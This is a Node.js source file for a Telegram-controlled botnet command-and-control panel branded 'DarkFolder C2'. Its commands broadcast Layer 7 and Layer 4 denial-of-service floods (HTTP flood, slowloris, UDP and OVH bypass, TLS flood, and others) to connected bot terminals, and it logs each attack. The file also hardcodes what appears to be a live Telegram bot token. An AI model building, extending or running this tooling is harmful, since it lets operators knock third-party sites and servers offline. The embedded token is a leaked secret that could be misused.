const TelegramBot = require('node-telegram-bot-api');
const { server, broadcastCommand, getConnectedTerminals } = require('./handler');
const fs = require('fs');

const token = '7850017086:AAHGs4V1i1SEEIjU4Sjc-79fDFY7sHjUV9g';
const bot = new TelegramBot(token, { polling: true });

const PORT = 5511;
const LOG_FILE = 'logs.txt';

let currentAttack = null;
let attackTimer = null;

server.listen(PORT, () => {
  console.log(`⚡ C2 Server running on port ${PORT}`);
});

function logAction(action) {
  const logEntry = `${new Date().toISOString()} - ${action}\n`;
  fs.appendFileSync(LOG_FILE, logEntry);
}

// ─────────── Telegram Commands ───────────

bot.onText(/\/start/, (msg) => {
  const welcomeMessage = `
👋 *Welcome to DarkFolder C2 Panel*  
💀 Operated by *admin* [@Cl1ckM3](https://t.me/Cl1ckM3)

🌐 [www.DarkFolder.org](https://www.DarkFolder.org)  
📢 [@DarkFolder_Channel](https://t.me/DarkFolder_Channel)

Use */help* to see the full command list.
`;
  bot.sendMessage(msg.chat.id, welcomeMessage, { parse_mode: 'Markdown' });
});

bot.onText(/\/help/, (msg) => {
  const helpText = `📖 *Available Commands*

🧨 *Layer 7 Attacks*:
/httpfuck <url> <time>
/crash <url> <GET/POST>
/httpflood <url> <threads> <GET/POST> <time>
/ovhraw <GET/POST/HEAD> <ip> <port> <time> <connections>
/httpsspoof <url> <time> <threads>
/slow <url> <time>
/hyper <url> <time>
/httprand <url> <time>
/httpget <url>

🧨 *Layer 4 Attacks*:
/stdv2 <ip> <port>
/slowloris <ip> <port>
/tcp <GET/POST/HEAD> <ip> <port> <connections>
/tlsflood <url>
/udp <ip> <port>
/std <ip> <port>
/udpbypass <ip> <port>

🛠 *Utilities*:
/stop - 🛑 Stop all attacks
/ongoing - 🔥 Show ongoing attack
/logs - 📜 Show attack logs
/methods - 📡 Show attack methods
/terminal - 💻 List connected terminals`;
  bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'Markdown' });
});

bot.onText(/\/methods/, (msg) => {
  const text = `📡 *Attack Methods*

💥 *Layer 7 (HTTP/HTTPS)*:
- httpfuck → HTTP-RAW
- crash → Hulk.go (DoS)
- httpflood → HTTP Flooder
- ovhraw → OVH Bypass
- httpsspoof → HTTPS Spoof
- slow → Slow.js
- hyper → Hyper.js
- httprequests → HTTP Requests
- httprand → HTTP Random
- httpget → HTTP GET Flood

🔨 *Layer 4 (TCP/UDP)*:
- stdv2 → STD Flood
- slowloris → Slow Loris
- tcp → 100UP-TCP Flood
- tlsflood → TLS JS Flood
- udp → UDP Flood
- std → STD NoSpoof
- udpbypass → UDP Bypass

⏱ All Layer 4 attacks run for 60 seconds by default.`;
  bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
});

bot.onText(/\/terminal/, (msg) => {
  const terminals = getConnectedTerminals();
  const list = terminals.length ? terminals.map(t => `💻 ${t}`).join('\n') : '❌ No terminals connected';
  bot.sendMessage(msg.chat.id, `🖥️ *Connected Terminals*\n${list}`, { parse_mode: 'Markdown' });
});

bot.onText(/\/logs/, (msg) => {
  const logs = fs.existsSync(LOG_FILE) ? fs.readFileSync(LOG_FILE, 'utf8') : '📜 No logs yet';
  bot.sendMessage(msg.chat.id, `📄 *Attack Logs*\n\`\`\`\n${logs}\n\`\`\``, { parse_mode: 'Markdown' });
});

bot.onText(/\/ongoing/, (msg) => {
  if (currentAttack) {
    const elapsed = Math.floor((Date.now() - currentAttack.startTime) / 1000);
    const remaining = Math.max(0, Math.floor((currentAttack.endTime - Date.now()) / 1000));
    bot.sendMessage(msg.chat.id,
      `🔥 *Ongoing Attack*\n` +
      `🛠 Method: ${currentAttack.method}\n` +
      `⏱ Elapsed: ${elapsed}s\n` +
      `⌛ Time Left: ${remaining}s\n` +
      `📡 Command:\n\`${currentAttack.cmd}\``,
      { parse_mode: 'Markdown' }
    );
  } else {
    bot.sendMessage(msg.chat.id, '✅ No ongoing attacks');
  }
});

bot.onText(/\/stop/, (msg) => {
  broadcastCommand('stop');
  currentAttack = null;
  if (attackTimer) clearTimeout(attackTimer);
  logAction('All attacks stopped');
  bot.sendMessage(msg.chat.id, '🛑 All attacks stopped successfully');
});

// ─────────── Main Attack Handler ───────────

function handleAttack(msg, method, cmdText, duration = 60000) {
  const chatId = msg.chat.id;

  if (currentAttack) {
    return bot.sendMessage(chatId, '⚠️ Attack already running! Use /stop first');
  }

  broadcastCommand(cmdText);

  currentAttack = {
    method: method.toUpperCase(),
    cmd: cmdText,
    startTime: Date.now(),
    endTime: Date.now() + duration
  };

  logAction(`Attack started: ${cmdText}`);
  bot.sendMessage(chatId, `🚀 *Attack Launched*\n⌛ Auto-stop in ${duration / 1000}s\n\`${cmdText}\``, { parse_mode: 'Markdown' });

  attackTimer = setTimeout(() => {
    broadcastCommand('stop');
    currentAttack = null;
    logAction('Attack auto-stopped');
    bot.sendMessage(chatId, '🕒 Attack automatically stopped after 60 seconds');
  }, duration);
}

// ─────────── Command Parsers ───────────

bot.on('message', (msg) => {
  const text = msg.text;
  if (!text) return;

  const parts = text.trim().split(' ');
  const cmd = parts[0];
  const chatId = msg.chat.id;

  if (cmd === '/httpfuck') {
    if (parts.length < 3) return bot.sendMessage(chatId, '❌ Usage: /httpfuck <url> <time>');
    handleAttack(msg, 'httpfuck', `http-raw ${parts[1]} ${parts[2]}`, parseInt(parts[2]) * 1000);
  }
  else if (cmd === '/crash') {
    if (parts.length < 3) return bot.sendMessage(chatId, '❌ Usage: /crash <url> <GET/POST>');
    handleAttack(msg, 'crash', `crash ${parts[1]} ${parts[2]}`);
  }
  else if (cmd === '/httpflood') {
    if (parts.length < 5) return bot.sendMessage(chatId, '❌ Usage: /httpflood <url> <threads> <GET/POST> <time>');
    handleAttack(msg, 'httpflood', `httpflood ${parts[1]} ${parts[2]} ${parts[3]} ${parts[4]}`, parseInt(parts[4]) * 1000);
  }
  else if (cmd === '/stdv2') {
    if (parts.length < 3) return bot.sendMessage(chatId, '❌ Usage: /stdv2 <ip> <port>');
    handleAttack(msg, 'stdv2', `stdv2 ${parts[1]} ${parts[2]}`, 60000);
  }
  else if (cmd === '/slowloris') {
    if (parts.length < 3) return bot.sendMessage(chatId, '❌ Usage: /slowloris <ip> <port>');
    handleAttack(msg, 'slowloris', `slowloris ${parts[1]} ${parts[2]}`, 60000);
  }
  else if (cmd === '/tcp') {
    if (parts.length < 5) return bot.sendMessage(chatId, '❌ Usage: /tcp <GET/POST/HEAD> <ip> <port> <connections>');
    handleAttack(msg, 'tcp', `tcp ${parts[1]} ${parts[2]} ${parts[3]} 60 ${parts[4]}`, 60000);
  }
  else if (cmd === '/tlsflood') {
    if (parts.length < 2) return bot.sendMessage(chatId, '❌ Usage: /tlsflood <url>');
    handleAttack(msg, 'tlsflood', `tlsflood ${parts[1]} - - 60`, 60000);
  }
  else if (cmd === '/httpsspoof') {
    if (parts.length < 4) return bot.sendMessage(chatId, '❌ Usage: /httpsspoof <url> <time> <threads>');
    handleAttack(msg, 'https-spoof', `https-spoof ${parts[1]} ${parts[2]} ${parts[3]}`, parseInt(parts[2]) * 1000);
  }
  else if (cmd === '/slow') {
    if (parts.length < 3) return bot.sendMessage(chatId, '❌ Usage: /slow <url> <time>');
    handleAttack(msg, 'slow', `slow ${parts[1]} ${parts[2]}`, parseInt(parts[2]) * 1000);
  }
  else if (cmd === '/hyper') {
    if (parts.length < 3) return bot.sendMessage(chatId, '❌ Usage: /hyper <url> <time>');
    handleAttack(msg, 'hyper', `hyper ${parts[1]} ${parts[2]}`, parseInt(parts[2]) * 1000);
  }
  else if (cmd === '/httprand') {
    if (parts.length < 3) return bot.sendMessage(chatId, '❌ Usage: /httprand <url> <time>');
    handleAttack(msg, 'http-rand', `http-rand ${parts[1]} ${parts[2]}`, parseInt(parts[2]) * 1000);
  }
  else if (cmd === '/httpget') {
    if (parts.length < 2) return bot.sendMessage(chatId, '❌ Usage: /httpget <url>');
    handleAttack(msg, 'httpget', `httpget ${parts[1]}`, 60000);
  }
  else if (cmd === '/ovhraw') {
    if (parts.length < 6) return bot.sendMessage(chatId, '❌ Usage: /ovhraw <GET/POST/HEAD> <ip> <port> <time> <connections>');
    handleAttack(msg, 'ovh-raw', `ovh-raw ${parts[1]} ${parts[2]} ${parts[3]} ${parts[4]} ${parts[5]}`, parseInt(parts[4]) * 1000);
  }
  else if (cmd === '/udp') {
    if (parts.length < 3) return bot.sendMessage(chatId, '❌ Usage: /udp <ip> <port>');
    handleAttack(msg, 'udp', `udp ${parts[1]} ${parts[2]}`, 60000);
  }
  else if (cmd === '/std') {
    if (parts.length < 3) return bot.sendMessage(chatId, '❌ Usage: /std <ip> <port>');
    handleAttack(msg, 'std', `std ${parts[1]} ${parts[2]}`, 60000);
  }
  else if (cmd === '/udpbypass') {
    if (parts.length < 3) return bot.sendMessage(chatId, '❌ Usage: /udpbypass <ip> <port>');
    handleAttack(msg, 'udpbypass', `udpbypass ${parts[1]} ${parts[2]}`, 60000);
  }
});